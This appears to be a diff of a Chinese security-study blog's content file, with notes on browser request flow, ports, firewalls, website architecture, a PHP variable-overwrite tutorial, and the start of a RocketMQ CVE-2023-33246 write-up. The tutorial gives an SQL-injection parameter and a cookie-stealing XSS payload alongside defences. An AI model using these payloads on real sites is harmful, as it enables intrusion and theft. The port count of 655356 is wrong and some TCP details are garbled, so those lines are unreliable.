-<h2 id="step2：建立tcp连接"><a href="#step2：建立tcp连接" class="headerlink" title="step2：建立tcp连接"></a>step2：建立tcp连接</h2><hr>
-<p>域名解析完成后，开始建立tcp连接，连接时进行三次握手，首先客户端发送syn报文，将标志位syn设为1，同步序列号设为x,进入syn_send状态，服务器收到请求后回一个ack报文，其中标志位syn设为1，ack标志位设为1，同步序列号设为y,确认号设为x+1，进入syn_recieve状态，客户端收到确认报文之后，发送确认报文到服务器，ack标志位设为1，确认号设为y+1,进入established状态，此时tcp连接建立完毕。</p>
-<h2 id="step3：发送请求"><a href="#step3：发送请求" class="headerlink" title="step3：发送请求"></a>step3：发送请求</h2><hr>
-<p>tcp连接建立后开始开始传送http协议数据内容，经过tcp&#x2F;ip协议五层层层封装，数据首先在五层编码成二进制，再到4层经过tcp层加上5层协议的端口号，根据数据链路层MTU对数据进行分段，然后到3层加上ip地址与4层协议号，然后数据到了三层后，首先判断目标ip地址是不是与本机处在同一网段，如果是在同一网段，则查询arp缓存表，或者进行arp广播，如果没有在同一网段则根据本机配置的网关地址，查询arp缓存表或者广播查询网关的mac地址，完成后封装帧头帧尾，然后数据被发送网关，由网关进行地址转换，然后层层路由到服务器端。</p>
-<h2 id="step4：服务器解析请求，发送数据"><a href="#step4：服务器解析请求，发送数据" class="headerlink" title="step4：服务器解析请求，发送数据"></a>step4：服务器解析请求，发送数据</h2><hr>
-<p>服务器根据请求内容返回相应内容，如果请求的是静态网页，将直接由web中间件根据url中请求的内容返回对应的数据，如果请求的是动态的页面，则web中间件将请求通过socket发送到动态脚本解析器解析执行，解析器若发现需要查询数据库，则会连接数据库进行查询并将数据添加到结果中，脚本解析器解析完后，将数据发回给web中间件，web中间件再发回给浏览器。</p>
-<h2 id="step5：断开连接"><a href="#step5：断开连接" class="headerlink" title="step5：断开连接"></a>step5：断开连接</h2><hr>
-<p>当浏览器没有要发送的数据时，服务器首先发送一个结束报文，我们称其为执行主动关闭，该报文中fin标志位设置为1，ack标志位设置位1，syn标志位设置位0，同步序列号为x,确认号设置为z,此时服务器关闭其发送数据服务，但仍然可以接受来自浏览器的数据，浏览器接收到后回复服务器一个ack报文，表示已经接收到了服务器的结束连接请求，设置ack标志位为1，syn标志位位0，fin标志位为0，同步序列号为z,此时如果浏览器仍然有请求，仍然可以发送给服务器，等到浏览器没有请求发送后，其会发送一个带有fin+ack标志位的包给服务器，并设置确认号位X，同步序列号位Y表示没有数据再发送给服务器了，进入lask_ack状态，当服务器收到该报文后，发送一个带有ack标记的包给浏览器，同步序列号设置为X，此时服务其进入最终确认状态fn_ack ,待等待了2msl(2倍报文最大生存时间)后，服务器释放连接。</p>
-<h2 id="step6：浏览器解析、渲染数据"><a href="#step6：浏览器解析、渲染数据" class="headerlink" title="step6：浏览器解析、渲染数据"></a>step6：浏览器解析、渲染数据</h2><hr>
-<p>客户端收到数据后，经过层层的解封装、重组等操作最终将数据发送到浏览器。浏览器接受到数据后首先将html代码构造成DOM树，css文件构造成CSSOM,这两个过程是同步进行，然后浏览器合并这两棵树，生成渲染树，最后进行重构，渲染等操作得到我们看到的网页</p>
-<h1 id="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"><a href="#QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？" class="headerlink" title="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"></a>QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？</h1><p><strong>共有655356个端口</strong></p>
-<ol>
-<li>0-1023 公认端口，一般都有特殊的含义，个人在分配端口的时候一般不使用这些端口</li>
-<li>1024-49151 注册端口：这些端口可以用于绑定一些服务</li>
-<li>49152-65535 私有端口：这些端口我们在测试的过程中可以使用</li>
-</ol>
-<h1 id="QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？"><a href="#QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？" class="headerlink" title="QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？"></a>QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？</h1><p>一般用作测试用，可以用于测试本机的网络配置是否成功，可以用于本机应用间的通信</p>
-<h1 id="QUESTION3：部署网站的体会"><a href="#QUESTION3：部署网站的体会" class="headerlink" title="QUESTION3：部署网站的体会"></a>QUESTION3：部署网站的体会</h1><p>我在部署过程中遇到的一个问题就是PHP版本不匹配的问题，我使用的PHP版本时7.3，这个版本的PHP与老的版本的PHP有较大的差别，就我所知道的，7.3版本里面单条mysql单条查询语句的执行函数时mysqli_query(),而老版本的PHP中确是mysql_qurey，所以我在发布网站之后，访问页面是一片空白。这个问题我在部署sqli_labs的时候也遇到过，不过当时有报错信息，所以我很快就找到了问题的根源，但这次却没有报错信息，所以浪费了很多的时间，还向刘俊岑请教了一下，我方才大彻大悟，可能是PHP版本不兼容导致的， 在我使用了低版本的PHP后，这个问题果然被解决了。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>浏览器</category>
-      </categories>
-      <tags>
-        <tag>浏览器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网站架构发展</title>
-    <url>/2025/04/10/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E5%8F%91%E5%B1%95/</url>
-    <content><![CDATA[<h1 id="网站架构发展"><a href="#网站架构发展" class="headerlink" title="网站架构发展"></a>网站架构发展</h1><h2 id="初始阶段的架构"><a href="#初始阶段的架构" class="headerlink" title="初始阶段的架构"></a>初始阶段的架构</h2><p>最初的架构所有的服务器都在同一台机器上面，没有太多的用户访问，不存在性能瓶颈</p>
-<p><img src="/2025/04/10/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E5%8F%91%E5%B1%95/Untitled.png" referrerpolicy="no-referrer"></p>
-<h2 id="应用服务器与数据服务的分离"><a href="#应用服务器与数据服务的分离" class="headerlink" title="应用服务器与数据服务的分离"></a>应用服务器与数据服务的分离</h2><p>随着业务的发展，服务器的瓶颈主键暴露了出来，最明显的一个问题就是服务器的存储空间不足，于是乎我们将应用于数据分厘，应用服务器、数据库服务器、文件服务器三者分离</p>
-<p><img src="/Untitled%201.png" referrerpolicy="no-referrer"></p>
-<h2 id="使用缓存改善网站性能"><a href="#使用缓存改善网站性能" class="headerlink" title="使用缓存改善网站性能"></a>使用缓存改善网站性能</h2><p>业务继续发展，数据库的压力越来越大，顶部业务的访问量占据了整个业务的80%的流量，于是乎便有了缓存服务器技术，将访问量大的数据提前缓存到缓存服务器，提升了服务的速率与质量。</p>
-<p><img src="/Untitled%202.png" referrerpolicy="no-referrer"></p>
-<h2 id="使用应用服务器集群改善网站的并发处理能力"><a href="#使用应用服务器集群改善网站的并发处理能力" class="headerlink" title="使用应用服务器集群改善网站的并发处理能力"></a>使用应用服务器集群改善网站的并发处理能力</h2><p>单一应用服务器在面对高并发的应用场景有明显的性能瓶颈，于是我们通过应用服务器集群来解决这个问题，通过一个负载均衡服务器来调度资源。</p>
-<p><img src="/Untitled%203.png" referrerpolicy="no-referrer"></p>
-<h2 id="数据库读写分离"><a href="#数据库读写分离" class="headerlink" title="数据库读写分离"></a>数据库读写分离</h2><p>使用了缓存后，基本解决了数据库读的压力，但随着业务的发展，数据写的压力越来愈大，这时候通过读写分离来解决，通过使用主从数据库服务器来优化数据库的性能，写入操作都到达主服务器，从服务器从主服务器处复制数据，读取操作都到从服务器。</p>
-<p><img src="/Untitled%204.png" referrerpolicy="no-referrer"></p>
-<h2 id="使用反向代理和-CDN-加速网站响应"><a href="#使用反向代理和-CDN-加速网站响应" class="headerlink" title="使用反向代理和 CDN 加速网站响应"></a>使用反向代理和 CDN 加速网站响应</h2><p>cdn 内容分发网络，通过将用户引流至离用户最近的服务器，减轻中心服务器的压力。通过dns服务器来实现负载均衡。</p>
-<p>反向代理 </p>
-<p><img src="/Untitled%205.png" referrerpolicy="no-referrer"></p>
-<h2 id="使用分布式文件系统和分布式数据库系统"><a href="#使用分布式文件系统和分布式数据库系统" class="headerlink" title="使用分布式文件系统和分布式数据库系统"></a>使用分布式文件系统和分布式数据库系统</h2><p>任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。</p>
-<p><img src="/Untitled%206.png" referrerpolicy="no-referrer"></p>
-<p>数据库划分有两种，分别是分割与分层</p>
-<p>分层是垂直的，将不同的业务的数据独立存储</p>
-<p>分割是水平的，当一个表的数据超过了数据库的性能极限的时候，将其分割成几篇存储到不同的服务器上面</p>
-<h2 id="使用-NoSQL-和搜索引擎"><a href="#使用-NoSQL-和搜索引擎" class="headerlink" title="使用 NoSQL 和搜索引擎"></a>使用 NoSQL 和搜索引擎</h2><p>随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。</p>
-<p><img src="/Untitled%207.png" referrerpolicy="no-referrer"></p>
-<h2 id="业务拆分"><a href="#业务拆分" class="headerlink" title="业务拆分"></a>业务拆分</h2><p>大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。</p>
-<p>具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统</p>
-<p><img src="/Untitled%208.png" referrerpolicy="no-referrer"></p>
-<h2 id="分布式服务"><a href="#分布式服务" class="headerlink" title="分布式服务"></a>分布式服务</h2><p>随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。</p>
-<p>既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。</p>
-<p><img src="/Untitled%209.png" referrerpolicy="no-referrer"></p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>网站</category>
-      </categories>
-      <tags>
-        <tag>网站</tag>
       </tags>
   </entry>
   <entry>
@@ -3724,6 +3639,168 @@
       <tags>
         <tag>Web</tag>
         <tag>前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>防火墙</title>
+    <url>/2025/04/10/%E9%98%B2%E7%81%AB%E5%A2%99/</url>
+    <content><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>防火墙一般不能防止病毒，只负责过滤流量，一般普遍的是二三四层的防火墙，基于ip\端口号等进行流量过滤，能有效防火ddos攻击。防火墙兼具路由、vpn等功能</p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a><strong>类型</strong></h2><ol>
+<li>代理防火墙<ol>
+<li>防火墙作为一个代理，内网流量到达防火墙之后，防火墙回复源主机，目标已到达，并同时修改源ip地址对数据包进行代理转发。整个是透明的</li>
+</ol>
+</li>
+<li>状态检测防火墙<ol>
+<li>当内网流量到达后，防火墙检查状态信息，发现没有匹配的状态，于是检查策略，发现该流量是允许通过的，于是记录源ip目标ipP源端口号目标端口号保存作为一条状态消息，然后检查路由表、nat地址池等记录关键信息作为状态，然后将流量进行放行。</li>
+<li>当流量回来后，防火墙首先进行状态匹配，若成功则通过该状态中存储的信息对数据进行装法，而不必在检查策略、检查路由表等操作。</li>
+</ol>
+</li>
+<li>DPI 深度包检测技术</li>
+<li>IPS 入侵防御系统 -应用层防火墙<ol>
+<li>检测并处理</li>
+<li>通过特征库来对流量进行过滤</li>
+</ol>
+</li>
+<li>IDS 入侵检测系统 -应用层防火墙<ol>
+<li>只做检测，不做处理，通常使用旁路安装，将经的流量复制一份进行检测，是透明的。</li>
+<li>通过特征库来对流量进行过滤</li>
+</ol>
+</li>
+<li>waf web应用防火墙<ol>
+<li>只针对web应用进行检测</li>
+</ol>
+</li>
+<li>用户行为防火墙<ol>
+<li>检查当前用户的上网行为，对用户上网行为进行监控，控制用户的访问情况，包括能访问那些网站，能使用那些应用，不能使用那些应用等。</li>
+</ol>
+</li>
+</ol>
+<h2 id="衡量指标"><a href="#衡量指标" class="headerlink" title="衡量指标"></a><strong>衡量指标</strong></h2><ol>
+<li>吞吐量</li>
+<li>时延</li>
+<li>丢包率</li>
+<li>并发连接数：能同时处理的会话</li>
+<li>新建连接数：单位时间内能同时新建的连接数</li>
+</ol>
+<h2 id="应用模式"><a href="#应用模式" class="headerlink" title="应用模式"></a><strong>应用模式</strong></h2><ol>
+<li>透明模式：防火墙端口工作在二层端口，对整个网络来说是透明的，三个区域工作在同一个网段</li>
+<li>路由模式：防火墙端口工作在三层端口，可配置nat\路由\vpn等，三个区域工作在不同的网段</li>
+<li>混杂模式：连接外网的端口工作在三层，另外两个区域的端口工作在二层。也可以让外部区域与DMZ区域的几口工作在三层，DMZ区域使用公网IP，内部区域接口工作在二层。</li>
+</ol>
+<h2 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a><strong>区域隔离</strong></h2><p>一般划分为三个区域，用来配置策略</p>
+<ol>
+<li>DMZ	非军事化区 ，当有网站需要对外发布的时候设置该区域，该区域一般不配置向内网的策略，也就是不能访问内网，用以保证内网的安全。</li>
+<li>内部区域</li>
+<li>外部区域</li>
+</ol>
+<h2 id="HA技术-双机热备"><a href="#HA技术-双机热备" class="headerlink" title="HA技术-双机热备"></a>HA技术-双机热备</h2><p>两台防火墙，一台为主防火墙，一台为备份防火墙，两台防火墙通过心跳线连接起来，互相交换状态信息，防火墙数据。两台防火墙同一侧的ip地址一样，心跳线两头的ip地址不一样。</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>安全设备</category>
+      </categories>
+      <tags>
+        <tag>防火墙</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>变量覆盖</title>
+    <url>/2025/04/10/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
+    <content><![CDATA[<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>使用自定义的参数值去覆盖替换程序原有的变量值。</p>
+<p>涉及函数：extract parse_str import_request_variables——php5.4版本以上已被弃用 $$</p>
+<p><strong>extract函数</strong></p>
+<p>该函数将一个数组注册成变量，每一对键值对对应一组变量。</p>
+<p><code>int extract (array,options,prefix)</code></p>
+<p>第一个参数为一个数组，为被操作量，第二个参数限定了变量注册的规则。当第二个参数为</p>
+<p><a href="%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2075f71fb7b52d48ac8f1fee5971481ad6/%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%20f6faafce79bd4e4483c243fcc670bbeb.csv">第二个参数</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpecho &quot;&lt;meta http-equiv=&#x27;content-type&#x27; content=&#x27;text/html;charset=utf-8&#x27;&gt;&quot;;//extract$a=10;echo &#x27;覆盖前$a：&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;$o=array(&#x27;a&#x27;=&gt;20,&#x27;b&#x27;=&gt;30);extract($o);echo &#x27;覆盖后$a：&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;echo &#x27;新注册变量$b：&#x27;.$b.&#x27;&lt;/br&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>parse_str函数</strong></p>
+<p>解析字符串注册变量，在注册变量之前不会验证它是否已经存在，所以会直接覆盖到之前的变量。</p>
+<p><code>void parse_str(string,array)</code></p>
+<p>第一个参数是要注册的字符串，形式为<code>a=1</code> 会被注册为<code>$a=1</code> ,当第二个参数存在的时候，该变量会被注册为一个数组。如果这个数组原本就存在相同的键，则会覆盖掉原有的键</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//parse_str//注册变量$d=111;echo &#x27;parse_str覆盖前$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;parse_str(&#x27;d=666&#x27;);echo &#x27;parse_str覆盖后$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;//注册数组parse_str(&#x27;d=8888&#x27;,$g);echo &#x27;parse_str注册数组覆盖后$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;var_dump(&#x27;parse_str覆盖后$g：&#x27;.$g.&#x27;&lt;/br&gt;&#x27;);echo $g[&#x27;d&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p><strong>import_request_variables函数</strong></p>
+<p>报get、post、cookie中的参数注册为变量，用在在register_globals被禁止的时候，因为存在安全风险，现在已经不建议使用。</p>
+<p><code>bool import_request_variables(types,prefix)</code></p>
+<p>types GPC</p>
+<p>prefix 前缀</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$h=11;//import_request_variables(&#x27;GP&#x27;); //已启用echo $h;</span><br></pre></td></tr></table></figure>
+
+<p><strong>$$变量覆盖</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php$a=10;echo $a;echo &#x27;&lt;/br&gt;&#x27;;foreach ($_POST as $key=&gt;$value)&#123;    $$key=$value;    echo $a;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过变量覆盖，我们可以直接覆盖所有之前的变量，比如说存在一天sql语句这么写的</p>
+<p><code>select * from &#123;$test&#125; where name=&#39;armandhe&#39;</code></p>
+<p>那么可以覆盖$test，传入</p>
+<p><code>?test=mysql.user limit 1%23</code></p>
+<p>这样就形成了sql注入</p>
+<p>也可以直接注入xss</p>
+<p>如果后台存在</p>
+<p><code>echo $a</code></p>
+<p>覆盖</p>
+<p><code>?a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
+<p>使用原始变量，$_GET等，不要玩花的。</p>
+</blockquote>
+<blockquote>
+<p>注册变量前，先验证变量是否存在。</p>
+</blockquote>
+<blockquote>
+<p>同一加前缀</p>
+</blockquote>
+<blockquote>
+<p>自行定义的变量一定要记住初始化， 不然即便注册变量的代码在最前面也会覆盖这些未初始化的变量。</p>
+</blockquote>
+<p>关闭 register_globals</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+        <tag>PHP</tag>
+        <tag>变量覆盖</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网站架构发展</title>
+    <url>/2025/04/10/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E5%8F%91%E5%B1%95/</url>
+    <content><![CDATA[<h1 id="网站架构发展"><a href="#网站架构发展" class="headerlink" title="网站架构发展"></a>网站架构发展</h1><h2 id="初始阶段的架构"><a href="#初始阶段的架构" class="headerlink" title="初始阶段的架构"></a>初始阶段的架构</h2><p>最初的架构所有的服务器都在同一台机器上面，没有太多的用户访问，不存在性能瓶颈</p>
+<p><img src="/2025/04/10/%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E5%8F%91%E5%B1%95/Untitled.png" referrerpolicy="no-referrer"></p>
+<h2 id="应用服务器与数据服务的分离"><a href="#应用服务器与数据服务的分离" class="headerlink" title="应用服务器与数据服务的分离"></a>应用服务器与数据服务的分离</h2><p>随着业务的发展，服务器的瓶颈主键暴露了出来，最明显的一个问题就是服务器的存储空间不足，于是乎我们将应用于数据分厘，应用服务器、数据库服务器、文件服务器三者分离</p>
+<p><img src="/Untitled%201.png" referrerpolicy="no-referrer"></p>
+<h2 id="使用缓存改善网站性能"><a href="#使用缓存改善网站性能" class="headerlink" title="使用缓存改善网站性能"></a>使用缓存改善网站性能</h2><p>业务继续发展，数据库的压力越来越大，顶部业务的访问量占据了整个业务的80%的流量，于是乎便有了缓存服务器技术，将访问量大的数据提前缓存到缓存服务器，提升了服务的速率与质量。</p>
+<p><img src="/Untitled%202.png" referrerpolicy="no-referrer"></p>
+<h2 id="使用应用服务器集群改善网站的并发处理能力"><a href="#使用应用服务器集群改善网站的并发处理能力" class="headerlink" title="使用应用服务器集群改善网站的并发处理能力"></a>使用应用服务器集群改善网站的并发处理能力</h2><p>单一应用服务器在面对高并发的应用场景有明显的性能瓶颈，于是我们通过应用服务器集群来解决这个问题，通过一个负载均衡服务器来调度资源。</p>
+<p><img src="/Untitled%203.png" referrerpolicy="no-referrer"></p>
+<h2 id="数据库读写分离"><a href="#数据库读写分离" class="headerlink" title="数据库读写分离"></a>数据库读写分离</h2><p>使用了缓存后，基本解决了数据库读的压力，但随着业务的发展，数据写的压力越来愈大，这时候通过读写分离来解决，通过使用主从数据库服务器来优化数据库的性能，写入操作都到达主服务器，从服务器从主服务器处复制数据，读取操作都到从服务器。</p>
+<p><img src="/Untitled%204.png" referrerpolicy="no-referrer"></p>
+<h2 id="使用反向代理和-CDN-加速网站响应"><a href="#使用反向代理和-CDN-加速网站响应" class="headerlink" title="使用反向代理和 CDN 加速网站响应"></a>使用反向代理和 CDN 加速网站响应</h2><p>cdn 内容分发网络，通过将用户引流至离用户最近的服务器，减轻中心服务器的压力。通过dns服务器来实现负载均衡。</p>
+<p>反向代理 </p>
+<p><img src="/Untitled%205.png" referrerpolicy="no-referrer"></p>
+<h2 id="使用分布式文件系统和分布式数据库系统"><a href="#使用分布式文件系统和分布式数据库系统" class="headerlink" title="使用分布式文件系统和分布式数据库系统"></a>使用分布式文件系统和分布式数据库系统</h2><p>任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。</p>
+<p><img src="/Untitled%206.png" referrerpolicy="no-referrer"></p>
+<p>数据库划分有两种，分别是分割与分层</p>
+<p>分层是垂直的，将不同的业务的数据独立存储</p>
+<p>分割是水平的，当一个表的数据超过了数据库的性能极限的时候，将其分割成几篇存储到不同的服务器上面</p>
+<h2 id="使用-NoSQL-和搜索引擎"><a href="#使用-NoSQL-和搜索引擎" class="headerlink" title="使用 NoSQL 和搜索引擎"></a>使用 NoSQL 和搜索引擎</h2><p>随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。</p>
+<p><img src="/Untitled%207.png" referrerpolicy="no-referrer"></p>
+<h2 id="业务拆分"><a href="#业务拆分" class="headerlink" title="业务拆分"></a>业务拆分</h2><p>大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。</p>
+<p>具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统</p>
+<p><img src="/Untitled%208.png" referrerpolicy="no-referrer"></p>
+<h2 id="分布式服务"><a href="#分布式服务" class="headerlink" title="分布式服务"></a>分布式服务</h2><p>随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。</p>
+<p>既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。</p>
+<p><img src="/Untitled%209.png" referrerpolicy="no-referrer"></p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>网站</category>
+      </categories>
+      <tags>
+        <tag>网站</tag>
       </tags>
   </entry>
   <entry>
@@ -4191,132 +4268,6 @@
       </tags>
   </entry>
   <entry>
-    <title>防火墙</title>
-    <url>/2025/04/10/%E9%98%B2%E7%81%AB%E5%A2%99/</url>
-    <content><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>防火墙一般不能防止病毒，只负责过滤流量，一般普遍的是二三四层的防火墙，基于ip\端口号等进行流量过滤，能有效防火ddos攻击。防火墙兼具路由、vpn等功能</p>
-<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a><strong>类型</strong></h2><ol>
-<li>代理防火墙<ol>
-<li>防火墙作为一个代理，内网流量到达防火墙之后，防火墙回复源主机，目标已到达，并同时修改源ip地址对数据包进行代理转发。整个是透明的</li>
-</ol>
-</li>
-<li>状态检测防火墙<ol>
-<li>当内网流量到达后，防火墙检查状态信息，发现没有匹配的状态，于是检查策略，发现该流量是允许通过的，于是记录源ip目标ipP源端口号目标端口号保存作为一条状态消息，然后检查路由表、nat地址池等记录关键信息作为状态，然后将流量进行放行。</li>
-<li>当流量回来后，防火墙首先进行状态匹配，若成功则通过该状态中存储的信息对数据进行装法，而不必在检查策略、检查路由表等操作。</li>
-</ol>
-</li>
-<li>DPI 深度包检测技术</li>
-<li>IPS 入侵防御系统 -应用层防火墙<ol>
-<li>检测并处理</li>
-<li>通过特征库来对流量进行过滤</li>
-</ol>
-</li>
-<li>IDS 入侵检测系统 -应用层防火墙<ol>
-<li>只做检测，不做处理，通常使用旁路安装，将经的流量复制一份进行检测，是透明的。</li>
-<li>通过特征库来对流量进行过滤</li>
-</ol>
-</li>
-<li>waf web应用防火墙<ol>
-<li>只针对web应用进行检测</li>
-</ol>
-</li>
-<li>用户行为防火墙<ol>
-<li>检查当前用户的上网行为，对用户上网行为进行监控，控制用户的访问情况，包括能访问那些网站，能使用那些应用，不能使用那些应用等。</li>
-</ol>
-</li>
-</ol>
-<h2 id="衡量指标"><a href="#衡量指标" class="headerlink" title="衡量指标"></a><strong>衡量指标</strong></h2><ol>
-<li>吞吐量</li>
-<li>时延</li>
-<li>丢包率</li>
-<li>并发连接数：能同时处理的会话</li>
-<li>新建连接数：单位时间内能同时新建的连接数</li>
-</ol>
-<h2 id="应用模式"><a href="#应用模式" class="headerlink" title="应用模式"></a><strong>应用模式</strong></h2><ol>
-<li>透明模式：防火墙端口工作在二层端口，对整个网络来说是透明的，三个区域工作在同一个网段</li>
-<li>路由模式：防火墙端口工作在三层端口，可配置nat\路由\vpn等，三个区域工作在不同的网段</li>
-<li>混杂模式：连接外网的端口工作在三层，另外两个区域的端口工作在二层。也可以让外部区域与DMZ区域的几口工作在三层，DMZ区域使用公网IP，内部区域接口工作在二层。</li>
-</ol>
-<h2 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a><strong>区域隔离</strong></h2><p>一般划分为三个区域，用来配置策略</p>
-<ol>
-<li>DMZ	非军事化区 ，当有网站需要对外发布的时候设置该区域，该区域一般不配置向内网的策略，也就是不能访问内网，用以保证内网的安全。</li>
-<li>内部区域</li>
-<li>外部区域</li>
-</ol>
-<h2 id="HA技术-双机热备"><a href="#HA技术-双机热备" class="headerlink" title="HA技术-双机热备"></a>HA技术-双机热备</h2><p>两台防火墙，一台为主防火墙，一台为备份防火墙，两台防火墙通过心跳线连接起来，互相交换状态信息，防火墙数据。两台防火墙同一侧的ip地址一样，心跳线两头的ip地址不一样。</p>
-]]></content>
-      <categories>
-        <category>安全技术</category>
-        <category>安全设备</category>
-      </categories>
-      <tags>
-        <tag>防火墙</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache RocketMQ 远程代码执行（CVE-2023-33246）</title>
-    <url>/2025/04/10/Apache-RocketMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2023-33246/</url>
-    <content><![CDATA[<h1 id="CVE-2023-33246"><a href="#CVE-2023-33246" class="headerlink" title="CVE-2023-33246"></a>CVE-2023-33246</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>RocketMQ是阿里巴巴在2012年开发的分布式消息中间件，后捐献给Apache软件基金会并成为Apache的顶级项目。RocketMQ专为万亿级超大规模的消息处理而设计，具有高吞吐量、低延迟、海量堆积、顺序收发等特点。</p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。漏洞源于RocketMQ的NameServer、Broker、Controller等多个组件暴露在公网中且缺乏权限校验。攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行任意操作系统命令。</p>
-<span id="more"></span>
-
-<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
-<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h3><p><strong>调试环境</strong></p>
-<p>访问项目官方仓库获取受影响漏洞版本源码</p>
